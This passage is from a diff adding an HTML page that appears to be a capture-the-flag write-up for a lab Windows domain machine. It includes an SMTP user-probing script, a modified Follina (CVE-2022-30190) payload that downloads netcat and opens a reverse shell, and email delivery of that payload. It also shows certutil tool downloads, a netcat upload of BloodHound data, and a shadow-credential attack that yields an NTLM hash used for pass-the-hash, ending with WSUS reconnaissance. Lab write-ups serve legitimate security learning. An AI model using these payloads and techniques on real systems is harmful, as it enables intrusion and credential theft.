+    <span class="k">def</span> <span class="nf">closeSock</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="kc">None</span>
+        <span class="k">return</span>
+
+    <span class="k">def</span> <span class="nf">rcptProbe</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">mail</span><span class="p">):</span>
+        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">mailfrom</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;EHLO all</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;MAIL FROM:</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">mailfrom</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">mailfrom</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="kc">False</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;RCPT TO:</span><span class="si">{</span><span class="n">mail</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+        <span class="k">if</span> <span class="s2">&quot;250&quot;</span> <span class="ow">in</span> <span class="n">response</span><span class="p">:</span>
+            <span class="k">return</span> <span class="kc">True</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">return</span> <span class="kc">False</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">smtp</span> <span class="o">=</span> <span class="n">Smpt</span><span class="p">(</span>
+        <span class="n">target</span><span class="o">=</span><span class="s2">&quot;10.10.11.175&quot;</span><span class="p">,</span>
+        <span class="n">userlist</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span>
+        <span class="n">mailfrom</span><span class="o">=</span><span class="s2">&quot;asdf@asdf.org&quot;</span>
+    <span class="p">)</span>
+    <span class="n">smtp</span><span class="o">.</span><span class="n">buildSock</span><span class="p">()</span>
+    <span class="n">smtp</span><span class="o">.</span><span class="n">readUsers</span><span class="p">()</span>
+    <span class="n">smtp</span><span class="o">.</span><span class="n">buildSock</span><span class="p">()</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">smtp</span><span class="o">.</span><span class="n">targetBanner</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+    <span class="n">clear</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[K&quot;</span>
+    <span class="n">green</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[32m&quot;</span>
+    <span class="n">reset</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[m&quot;</span>
+    <span class="k">for</span> <span class="n">name</span> <span class="ow">in</span> <span class="n">smtp</span><span class="o">.</span><span class="n">userlist</span><span class="p">:</span>
+        <span class="n">mail</span> <span class="o">=</span> <span class="n">name</span><span class="o">+</span><span class="s2">&quot;@outdated.htb&quot;</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">mail</span><span class="si">}{</span><span class="n">clear</span><span class="si">}</span><span class="se">\r</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">smtp</span><span class="o">.</span><span class="n">rcptProbe</span><span class="p">(</span><span class="n">mail</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">result</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\r</span><span class="si">{</span><span class="n">green</span><span class="si">}</span><span class="s2">Found one:</span><span class="si">{</span><span class="n">reset</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">mail</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">smtp</span><span class="o">.</span><span class="n">closeSock</span><span class="p">()</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>smtp_rcpt_brute.py<span class="w"> </span>words
+mail.outdated.htb<span class="w"> </span>ESMTP
+
+Found<span class="w"> </span>one:<span class="w"> </span>itsupport@outdated.htb
+</pre></div>
+</div>
+<p>I didn’t find anyting more on this box, but I figured, it could still potentially be usefull in the future</p>
+</section>
+<section id="smb-enum">
+<h2>SMB enum<a class="headerlink" href="#smb-enum" title="Permalink to this heading">#</a></h2>
+<p>back to actually trying to do something with the machine</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nbtscan<span class="w"> </span><span class="m">10</span>.10.11.168
+smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">10</span>.10.11.175
+smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">10</span>.10.11.175<span class="w"> </span>-u<span class="w"> </span>null<span class="w"> </span>-p<span class="w"> </span>null
+smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">10</span>.10.11.175<span class="w"> </span>-u<span class="w"> </span>guest
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>Disk<span class="w">                                                    </span>Permissions<span class="w">     </span>Comment
+----<span class="w">                                                    </span>-----------<span class="w">     </span>-------
+ADMIN$<span class="w">                                                  </span>NO<span class="w"> </span>ACCESS<span class="w">       </span>Remote<span class="w"> </span>Admin
+C$<span class="w">                                                      </span>NO<span class="w"> </span>ACCESS<span class="w">       </span>Default<span class="w"> </span>share
+IPC$<span class="w">                                                    </span>READ<span class="w"> </span>ONLY<span class="w">       </span>Remote<span class="w"> </span>IPC
+NETLOGON<span class="w">                                                </span>NO<span class="w"> </span>ACCESS<span class="w">       </span>Logon<span class="w"> </span>server<span class="w"> </span>share
+Shares<span class="w">                                                  </span>READ<span class="w"> </span>ONLY
+SYSVOL<span class="w">                                                  </span>NO<span class="w"> </span>ACCESS<span class="w">       </span>Logon<span class="w"> </span>server<span class="w"> </span>share
+UpdateServicesPackages<span class="w">                                  </span>NO<span class="w"> </span>ACCESS<span class="w">       </span>A<span class="w"> </span>network<span class="w"> </span>share<span class="w"> </span>to<span class="w"> </span>be<span class="w"> </span>used<span class="w"> </span>by<span class="w"> </span>client<span class="w"> </span>systems<span class="w"> </span><span class="k">for</span><span class="w"> </span>collecting<span class="w"> </span>all<span class="w"> </span>software<span class="w"> </span>packages<span class="w"> </span><span class="o">(</span>usually<span class="w"> </span>applications<span class="o">)</span><span class="w"> </span>published<span class="w"> </span>on<span class="w"> </span>this<span class="w"> </span>WSUS<span class="w"> </span>system.
+WsusContent<span class="w">                                             </span>NO<span class="w"> </span>ACCESS<span class="w">       </span>A<span class="w"> </span>network<span class="w"> </span>share<span class="w"> </span>to<span class="w"> </span>be<span class="w"> </span>used<span class="w"> </span>by<span class="w"> </span>Local<span class="w"> </span>Publishing<span class="w"> </span>to<span class="w"> </span>place<span class="w"> </span>published<span class="w"> </span>content<span class="w"> </span>on<span class="w"> </span>this<span class="w"> </span>WSUS<span class="w"> </span>system.
+WSUSTemp<span class="w">                                                </span>NO<span class="w"> </span>ACCESS<span class="w">       </span>A<span class="w"> </span>network<span class="w"> </span>share<span class="w"> </span>used<span class="w"> </span>by<span class="w"> </span>Local<span class="w"> </span>Publishing<span class="w"> </span>from<span class="w"> </span>a<span class="w"> </span>Remote<span class="w"> </span>WSUS<span class="w"> </span>Console<span class="w"> </span>Instance.
+</pre></div>
+</div>
+<p>We have access to “IPC$” and “Shares”, IPC$ is apparently empty</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>smbclient<span class="w"> </span>-U<span class="w"> </span>guest<span class="w"> </span>-N<span class="w"> </span>//10.10.11.175/Shares
+smbclient<span class="w"> </span>--no-pass<span class="w"> </span>//10.10.11.175/Shares
+</pre></div>
+</div>
+<p>but there a pdf in Shares</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>ls
+<span class="w">  </span>.<span class="w">                                   </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Mon<span class="w"> </span>Jun<span class="w"> </span><span class="m">20</span><span class="w"> </span><span class="m">16</span>:01:33<span class="w"> </span><span class="m">2022</span>
+<span class="w">  </span>..<span class="w">                                  </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Mon<span class="w"> </span>Jun<span class="w"> </span><span class="m">20</span><span class="w"> </span><span class="m">16</span>:01:33<span class="w"> </span><span class="m">2022</span>
+<span class="w">  </span>NOC_Reminder.pdf<span class="w">                   </span>AR<span class="w">   </span><span class="m">106977</span><span class="w">  </span>Mon<span class="w"> </span>Jun<span class="w"> </span><span class="m">20</span><span class="w"> </span><span class="m">16</span>:00:32<span class="w"> </span><span class="m">2022</span>
+
+<span class="w">                </span><span class="m">9116415</span><span class="w"> </span>blocks<span class="w"> </span>of<span class="w"> </span>size<span class="w"> </span><span class="m">4096</span>.<span class="w"> </span><span class="m">1591614</span><span class="w"> </span>blocks<span class="w"> </span>available
+
+smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>get<span class="w"> </span>NOC_Reminder.pdf
+getting<span class="w"> </span>file<span class="w"> </span><span class="se">\N</span>OC_Reminder.pdf<span class="w"> </span>of<span class="w"> </span>size<span class="w"> </span><span class="m">106977</span><span class="w"> </span>as<span class="w"> </span>NOC_Reminder.pdf<span class="w"> </span><span class="o">(</span><span class="m">159</span>.3<span class="w"> </span>KiloBytes/sec<span class="o">)</span><span class="w"> </span><span class="o">(</span>average<span class="w"> </span><span class="m">159</span>.3<span class="w"> </span>KiloBytes/sec<span class="o">)</span>
+</pre></div>
+</div>
+<p>From the pdf we get good indication that this is gonna be about sending a Follina payload to the support email</p>
+</section>
+<section id="cve-2022-30190-follina">
+<h2>CVE-2022-30190 - Follina<a class="headerlink" href="#cve-2022-30190-follina" title="Permalink to this heading">#</a></h2>
+<p>Lord John Hammond did a thing, and it’s really nice:
+<a class="reference external" href="https://github.com/JohnHammond/msdt-follina">https://github.com/JohnHammond/msdt-follina</a><br />
+with the simplest args this generates a follina payload, and serves it over http on port 8000<br />
+if we use the –reverse flag, it slaps a reverse shell payload into the follina ms-msdt thing<br />
+and even opens a netcat listener for us to catch the shell<br />
+the code John wrote is actually fetching nc64.exe from his own github<br />
+and uses that to call back from the victim’s machine<br />
+Of course this isn’t gonna do the trick for us, since the victim doesn’t have internet access<br />
+So lets change the code slightly to host nc64.exe on our machine on another webserver on 9191</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">reverse</span><span class="p">:</span>
+        <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;&quot;&quot;Invoke-WebRequest http://10.10.14.43:9191/nc64.exe -OutFile C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">Tasks</span><span class="se">\\</span><span class="s2">nc.exe; C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">Tasks</span><span class="se">\\</span><span class="s2">nc.exe -e cmd.exe </span><span class="si">{</span><span class="n">serve_host</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">reverse</span><span class="si">}</span><span class="s2">&quot;&quot;&quot;</span>
+
+    <span class="c1"># Base64 encode our command so whitespace is respected</span>
+    <span class="n">base64_payload</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">command</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">)</span>
+
+    <span class="c1"># Slap together a unique MS-MSDT payload that is over 4096 bytes at minimum</span>
+    <span class="n">html_payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;&quot;&quot;&lt;script&gt;location.href = &quot;ms-msdt:/id PCWDiagnostic /skip force /param </span><span class="se">\\</span><span class="s2">&quot;IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression(&#39;[System.Text.Encoding]&#39;+[char]58+[char]58+&#39;UTF8.GetString([System.Convert]&#39;+[char]58+[char]58+&#39;FromBase64String(&#39;+[char]34+&#39;</span><span class="si">{</span><span class="n">base64_payload</span><span class="si">}</span><span class="s2">&#39;+[char]34+&#39;))&#39;))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe</span><span class="se">\\</span><span class="s2">&quot;&quot;; //&quot;&quot;&quot;</span>
+    <span class="n">html_payload</span> <span class="o">+=</span> <span class="p">(</span>
+        <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4096</span><span class="p">)])</span>
+        <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&lt;/script&gt;&quot;</span>
+    <span class="p">)</span>
+</pre></div>
+</div>
+<p>generating the payload and starting the webserver and listener all at once</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>./follina.py<span class="w"> </span>-i<span class="w"> </span>tun0<span class="w"> </span>-r<span class="w"> </span><span class="m">9090</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>copied<span class="w"> </span>staging<span class="w"> </span>doc<span class="w"> </span>/tmp/y9v6zrd8
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>created<span class="w"> </span>maldoc<span class="w"> </span>./follina.doc
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>serving<span class="w"> </span>html<span class="w"> </span>payload<span class="w"> </span>on<span class="w"> </span>:8000
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>starting<span class="w"> </span><span class="s1">&#39;nc -lvnp 9090&#39;</span>
+listening<span class="w"> </span>on<span class="w"> </span><span class="o">[</span>any<span class="o">]</span><span class="w"> </span><span class="m">9090</span><span class="w"> </span>...
+</pre></div>
+</div>
+<p>and starting the webserver on 9191 for netcat</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">9191</span><span class="w">                               </span><span class="m">2</span><span class="w"> </span>⨯
+Serving<span class="w"> </span>HTTP<span class="w"> </span>on<span class="w"> </span><span class="m">0</span>.0.0.0<span class="w"> </span>port<span class="w"> </span><span class="m">9191</span><span class="w"> </span><span class="o">(</span>http://0.0.0.0:9191/<span class="o">)</span><span class="w"> </span>...
+</pre></div>
+</div>
+<p>Double checking how the payload was generated</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-s<span class="w"> </span>http://10.10.14.43:8000<span class="p">|</span>awk<span class="w"> </span>-F<span class="w"> </span><span class="s1">&#39;+&#39;</span><span class="w"> </span><span class="s1">&#39;{print $9}&#39;</span><span class="p">|</span>tr<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;&#39;&quot;</span><span class="p">|</span>base64<span class="w"> </span>-d
+Invoke-WebRequest<span class="w"> </span>http://10.10.14.43:9191/nc64.exe<span class="w"> </span>-OutFile<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\T</span>asks<span class="se">\n</span>c.exe<span class="p">;</span><span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\T</span>asks<span class="se">\n</span>c.exe<span class="w"> </span>-e<span class="w"> </span>cmd.exe<span class="w"> </span><span class="m">10</span>.10.14.43<span class="w"> </span><span class="m">9090</span>
+</pre></div>
+</div>
+<p>now the only thing left to do is to deliver the payload<br />
+We’ll do that by sending a link to our local webserver hosting the follina payload over email to the itsupport team.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>swaks<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--from<span class="w"> </span>asdf@asdf.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--to<span class="w"> </span>itsupport@outdated.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--header<span class="w"> </span><span class="s2">&quot;Subject: asdfasdfasdfasdf&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--server<span class="w"> </span>mail.outdated.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--body<span class="w"> </span><span class="s1">&#39;http://10.10.14.43:8000&#39;</span>
+</pre></div>
+</div>
+<p>couldn’t get a callback though, will try again some other day
+after trying a third day in a row, I finally got a callback, the only difference with today’s payload is, I hosted it myself instead of via the tool and it was servers on port 80 from an index.htlm text file.
+I’m pretty sure this didn’t have any incidence on it working or not.
+The machine is just utterly unstable.</p>
+</section>
+<section id="bloodhound">
+<h2>BloodHound<a class="headerlink" href="#bloodhound" title="Permalink to this heading">#</a></h2>
+<p>uploading sharphound on the box with certutil</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>certutil.exe<span class="w"> </span>-urlcache<span class="w"> </span>-f<span class="w"> </span>http://10.10.14.83:8000/SharpHound.exe<span class="w"> </span>SharpHound.exe
+./SharpHound.exe<span class="w"> </span>-c<span class="w"> </span>All<span class="w"> </span>--zipfilename<span class="w"> </span>output.zip
+</pre></div>
+</div>
+<p>exfiltrate the data</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nc64.exe<span class="w"> </span><span class="m">10</span>.10.14.83<span class="w"> </span><span class="m">4242</span><span class="w"> </span>&lt;<span class="w"> </span>output.zip
+nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4242</span><span class="w"> </span>&gt;<span class="w"> </span>output.zip
+</pre></div>
+</div>
+</section>
+<section id="shadow-credential">
+<h2>Shadow Credential<a class="headerlink" href="#shadow-credential" title="Permalink to this heading">#</a></h2>
+<p>Uploading Rubeus and Whisker to the machine to perform the shadow credential attack
+I had to build whisker from source on a windows VM, and uploading the dotnet executable on the machine using certutil.exe.
+Yes I got a different ip in the meantime, this box is really unstable, so I change VPN servers often to get to a working one.
+Rubeus is already available as a binary in GhostPack</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>certutil.exe<span class="w"> </span>-urlcache<span class="w"> </span>-f<span class="w"> </span>http://10.10.14.15:8000/Whisker.exe<span class="w"> </span>Whisker.exe
+certutil.exe<span class="w"> </span>-urlcache<span class="w"> </span>-f<span class="w"> </span>http://10.10.14.15:8000/Rubeus.exe<span class="w"> </span>Rubeus.exe
+</pre></div>
+</div>
+<p>running whisker to add a new cred to sflowers</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>Whisker.exe<span class="w"> </span>add<span class="w"> </span>/target:sflowers
+</pre></div>
+</div>
+<p>whisker then gives the exact syntax for rubeus to pull sflower’s TGT.<br />
+which looks like this:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>Rubeus.exe<span class="w"> </span>asktgt<span class="w"> </span>/user:sflowers<span class="w"> </span>/certificate:&lt;b64&gt;<span class="w"> </span>/password:<span class="s2">&quot;hlyTBJYNHmGRbKJa&quot;</span><span class="w"> </span>/domain:outdated.htb<span class="w"> </span>/dc:DC.outdated.htb<span class="w"> </span>/getcredentials<span class="w"> </span>/show
+
+
+<span class="w">   </span>______<span class="w">        </span>_
+<span class="w">  </span><span class="o">(</span>_____<span class="w"> </span><span class="se">\ </span><span class="w">     </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>
+<span class="w">   </span>_____<span class="o">)</span><span class="w"> </span><span class="o">)</span>_<span class="w">   </span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span>__<span class="w">  </span>_____<span class="w"> </span>_<span class="w">   </span>_<span class="w">  </span>___
+<span class="w">  </span><span class="p">|</span><span class="w">  </span>__<span class="w">  </span>/<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">  </span>_<span class="w"> </span><span class="se">\|</span><span class="w"> </span>___<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>/___<span class="o">)</span>
+<span class="w">  </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">  </span><span class="se">\ \|</span><span class="w"> </span><span class="p">|</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="o">)</span><span class="w"> </span><span class="o">)</span><span class="w"> </span>____<span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span>___<span class="w"> </span><span class="p">|</span>
+<span class="w">  </span><span class="p">|</span>_<span class="p">|</span><span class="w">   </span><span class="p">|</span>_<span class="p">|</span>____/<span class="p">|</span>____/<span class="p">|</span>_____<span class="o">)</span>____/<span class="o">(</span>___/
+
+<span class="w">  </span>v2.1.2
+
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Action:<span class="w"> </span>Ask<span class="w"> </span>TGT
+
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Using<span class="w"> </span>PKINIT<span class="w"> </span>with<span class="w"> </span>etype<span class="w"> </span>rc4_hmac<span class="w"> </span>and<span class="w"> </span>subject:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>sflowers
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Building<span class="w"> </span>AS-REQ<span class="w"> </span><span class="o">(</span>w/<span class="w"> </span>PKINIT<span class="w"> </span>preauth<span class="o">)</span><span class="w"> </span><span class="k">for</span>:<span class="w"> </span><span class="s1">&#39;outdated.htb\sflowers&#39;</span>
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Using<span class="w"> </span>domain<span class="w"> </span>controller:<span class="w"> </span><span class="m">172</span>.16.20.1:88
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>TGT<span class="w"> </span>request<span class="w"> </span>successful!
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>base64<span class="o">(</span>ticket.kirbi<span class="o">)</span>:
+
+<span class="w">      </span>doIF0jCCBc6gAwIBBaEDAgEWooIE5zCCBONhggTfMIIE26ADAgEFoQ4bDE9VVERBVEVELkhUQqIhMB+g
+<span class="w">      </span>*********************************SNIP*******************************************
+<span class="w">      </span>NTVaqA4bDE9VVERBVEVELkhUQqkhMB+gAwIBAqEYMBYbBmtyYnRndBsMb3V0ZGF0ZWQuaHRi
+
+<span class="w">  </span>ServiceName<span class="w">              </span>:<span class="w">  </span>krbtgt/outdated.htb
+<span class="w">  </span>ServiceRealm<span class="w">             </span>:<span class="w">  </span>OUTDATED.HTB
+<span class="w">  </span>UserName<span class="w">                 </span>:<span class="w">  </span>sflowers
+<span class="w">  </span>UserRealm<span class="w">                </span>:<span class="w">  </span>OUTDATED.HTB
+<span class="w">  </span>StartTime<span class="w">                </span>:<span class="w">  </span><span class="m">10</span>/8/2022<span class="w"> </span><span class="m">12</span>:24:55<span class="w"> </span>PM
+<span class="w">  </span>EndTime<span class="w">                  </span>:<span class="w">  </span><span class="m">10</span>/8/2022<span class="w"> </span><span class="m">10</span>:24:55<span class="w"> </span>PM
+<span class="w">  </span>RenewTill<span class="w">                </span>:<span class="w">  </span><span class="m">10</span>/15/2022<span class="w"> </span><span class="m">12</span>:24:55<span class="w"> </span>PM
+<span class="w">  </span>Flags<span class="w">                    </span>:<span class="w">  </span>name_canonicalize,<span class="w"> </span>pre_authent,<span class="w"> </span>initial,<span class="w"> </span>renewable,<span class="w"> </span>forwardable
+<span class="w">  </span>KeyType<span class="w">                  </span>:<span class="w">  </span>rc4_hmac
+<span class="w">  </span>Base64<span class="o">(</span>key<span class="o">)</span><span class="w">              </span>:<span class="w">  </span>ZFjdNOAHmXZtdFcrIm/m2w<span class="o">==</span>
+<span class="w">  </span>ASREP<span class="w"> </span><span class="o">(</span>key<span class="o">)</span><span class="w">              </span>:<span class="w">  </span>A187BB482CB402C93329AE80D660039C
+
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Getting<span class="w"> </span>credentials<span class="w"> </span>using<span class="w"> </span>U2U
+
+<span class="w">  </span>CredentialInfo<span class="w">         </span>:
+<span class="w">    </span>Version<span class="w">              </span>:<span class="w"> </span><span class="m">0</span>
+<span class="w">    </span>EncryptionType<span class="w">       </span>:<span class="w"> </span>rc4_hmac
+<span class="w">    </span>CredentialData<span class="w">       </span>:
+<span class="w">      </span>CredentialCount<span class="w">    </span>:<span class="w"> </span><span class="m">1</span>
+<span class="w">       </span>NTLM<span class="w">              </span>:<span class="w"> </span>1FCDB1F6015DCB318CC77BB2BDA14DB5
+</pre></div>
+</div>
+<p>Now we can use evil-winrm to PS remote in the machine as sflowers</p>
+</section>
+<section id="discovering-a-non-tls-wsus">
+<h2>Discovering a non TLS WSUS<a class="headerlink" href="#discovering-a-non-tls-wsus" title="Permalink to this heading">#</a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>evil-winrm<span class="w"> </span>-i<span class="w"> </span>outdated.htb<span class="w"> </span>-u<span class="w"> </span>sflowers<span class="w"> </span>-H<span class="w"> </span>1FCDB1F6015DCB318CC77BB2BDA14DB5
+</pre></div>
+</div>
+<p>Using winpeas, we can see that there is a WSUS server that is running without TLS</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">cd</span><span class="w"> </span><span class="nv">$Env</span>:temp
+certutil.exe<span class="w"> </span>-urlcache<span class="w"> </span>-f<span class="w"> </span>http://10.10.14.15:8000/winpeas.bat<span class="w"> </span>winpeas.bat
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="w"> </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>WSUS
+<span class="w">   </span><span class="o">[</span>i<span class="o">]</span><span class="w"> </span>You<span class="w"> </span>can<span class="w"> </span>inject<span class="w"> </span><span class="s1">&#39;fake&#39;</span><span class="w"> </span>updates<span class="w"> </span>into<span class="w"> </span>non-SSL<span class="w"> </span>WSUS<span class="w"> </span>traffic<span class="w"> </span><span class="o">(</span>WSUXploit<span class="o">)</span>
+<span class="w">   </span><span class="o">[</span>?<span class="o">]</span><span class="w"> </span>https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus
+<span class="w">    </span>WUServer<span class="w">    </span>REG_SZ<span class="w">    </span>http://wsus.outdated.htb:8530
+</pre></div>
+</div>
+<p>checking further on registry keys</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>reg<span class="w"> </span>query<span class="w"> </span>HKLM<span class="se">\S</span>oftware<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\W</span>indowsUpdate<span class="w"> </span>/v<span class="w"> </span>WUServer
+
+HKEY_LOCAL_MACHINE<span class="se">\S</span>oftware<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\W</span>indowsUpdate
+<span class="w">    </span>WUServer<span class="w">    </span>REG_SZ<span class="w">    </span>http://wsus.outdated.htb:8530
+</pre></div>
+</div>
+<p>the wsus server is indeed http and not https</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>reg<span class="w"> </span>query<span class="w"> </span>HKLM<span class="se">\S</span>oftware<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\W</span>indowsUpdate<span class="se">\A</span>U<span class="w"> </span>/v<span class="w"> </span>UseWUServer
+
+HKEY_LOCAL_MACHINE<span class="se">\S</span>oftware<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\W</span>indowsUpdate<span class="se">\A</span>U
+<span class="w">    </span>UseWUServer<span class="w">    </span>REG_DWORD<span class="w">    </span>0x1
+</pre></div>
+</div>
+<p>and the UseWUServer is 1, so it’s turned on</p>
+</section>
+<section id="exploiting-wsus">
